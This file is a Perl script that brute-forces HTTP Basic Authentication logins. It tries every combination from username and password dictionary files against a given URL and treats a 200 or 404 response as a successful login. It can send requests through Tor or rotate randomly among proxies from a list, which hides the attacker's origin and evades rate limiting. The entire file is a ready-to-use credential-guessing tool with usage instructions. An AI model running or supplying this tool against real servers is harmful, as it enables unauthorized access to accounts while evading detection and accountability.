#!/usr/local/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use feature qw(switch say);
use MIME::Base64 qw(encode_base64);
use Getopt::Long;
use Carp;
use URI::Split qw(uri_split);
use Term::ANSIColor qw(:constants);

local $Term::ANSIColor::AUTORESET = 1;

my  $help = q{};
my  $url = q{};
my  $host = q{};
my  $username = q{};
my  $password = q{};
my  $tor = q{};
my  $proxy = q{};
my  $debug = q{};

GetOptions(
    'help|h'=>\$help,
    'url=s'=>\$url,
    'username=s'=>\$username,
    'password=s'=>\$password,
    'host=s'=>\$host,
    'tor'=>\$tor,
    'proxy=s'=>\$proxy,
    'vv'=>\$debug,
);

if($help){
    print <<__HELP__;
Notice: In order to run this script you must have those modules installed

cpan -i LWP::UserAgent
cpan -i LWP::Protocol::https
cpan -i LWP::Protocol::socks
cpan -i MIME::Base64
cpan -i Getopt::Long
cpan -i URI::Split
cpan -i Term::ANSIColor

Usage: $0 -url http://www.xxx.com/xxx/ -username tanjiti -password qwerasdf
[-host www.xxx.com] [-tor] [-proxy http://xxx.xxx.xxx.:7808] [-vv]
where:
-url : Specify the url for basic Authentication

-username : Specify the username for authentication, it can be a username string or username dict filename

-password: Specify the password for authentication, it can be a password
string or password dict filename

-host: Specify the hostname for Host header , default value is split from url

-tor: Specify use the tor, You need install tor first like apt-get install tor
on Debian/Ubuntu  

-proxy: Specify the proxy,it can ben a proxy string like
"http://23.228.65.132:7808" or proxy list filename

-vv: Specify the http request and response information

-h : For more help

__HELP__
    exit 0;


}


chomp $url;
chomp $username;
chomp $password;
chomp $host;
chomp $proxy;

croak "You need to specify the basic authentication URL, username(username dict
filename), password(password dict filename) \n Please run --help for more information. \n" if $url eq q{} or $username eq q{} or $password eq q{};

#Get host part from $url
my ($scheme,$auth,$path,$query,$frag) = uri_split($url);


$host = $auth if defined $auth and $host eq q{};

##################################################################
##  readFromFile(): storage the file contents into an array     ##
##  parameter: $filename                                        ##
##  return: @contents(array)                                    ##
##################################################################
sub readFromFile{
    my $filename = shift;
    open my ($FH), "<", $filename or die "cannot open $filename for reading:  $! \n";
    my @contents = ();

    while(<$FH>){
        chomp $_;
        push @contents, $_;
    }
    close $FH;
    return @contents;
}

##################################################################
##  getCode(): set http request and got http response code      ##
##  parameters:$url,$username,$password,$host,$proxy                            
##  return : $response->code(string)                            ##
##################################################################
sub getCode{
    my ($url,$username,$password,$host,$proxy) = @_;


    my $authenBase64 = encode_base64("$username:$password");

    my $ua = LWP::UserAgent->new;
    $ua->agent("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0");
    $ua->timeout(10);
    $ua->default_headers->push_header('Accept'=>'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
    $ua->default_headers->push_header('Accept-Encoding'=>'gzip,deflate,sdch');
    $ua->default_headers->push_header('Authorization' => "Basic $authenBase64");
    $ua->default_headers->push_header('Host' => $host);
    $ua->default_headers->push_header('Connection' => 'keep-alive');
    $ua->show_progress(1);
    $ua->ssl_opts("verify_hostname" => 1);
    $ua->proxy([qw/http https/] => $proxy) if $proxy;
    my $response = $ua->get($url);
    say BOLD BLUE $response->request->as_string if $debug;
    say BOLD CYAN $response->headers->as_string if $debug;
    return $response->code;
}


##################################################################
##  tryLogin(): try username(dict),password(dict) use tor or proxy(list) or nothing
##  parameters: $url, $usernames_ref, $passwords_ref, $host, $tor, $proxy_ref
##  return: result(string)
##################################################################
sub tryLogin{
    my ($url, $usernames_ref, $passwords_ref, $host, $tor, $proxy_ref) =  @_;
    my @usernames = @$usernames_ref;
    my @passwords = @$passwords_ref;
    my @proxys = @$proxy_ref;
    
    my $proxy = $proxys[0];

    $proxy = "socks://localhost:9050" if $tor;

    foreach my $password (@passwords){
        foreach my $username (@usernames){
            say BOLD YELLOW "Now try $username : $password ";
            
            if($#proxys > 0){
                srand(time|$$);
                my $number = int(rand($#proxys));
                $proxy = $proxys[$number];
            }
            say BOLD YELLOW "Use Proxy: $proxy " if $proxy;
            my $code = getCode($url, $username,  $password, $host, $proxy);
            return "Login $url Success with $username and $password" if $code
            == 404 or $code == 200;
        }
    }
    return "Login $url Failed !!!!";
}


my @usernames =   -r $username ? readFromFile($username) : $username;
my @passwords =   -r $password ? readFromFile($password) : $password;
my @proxys = -r $proxy ? readFromFile($proxy) : $proxy;

my $result = tryLogin($url,\@usernames,\@passwords,$host,$tor,\@proxys);

say BOLD RED $result ;

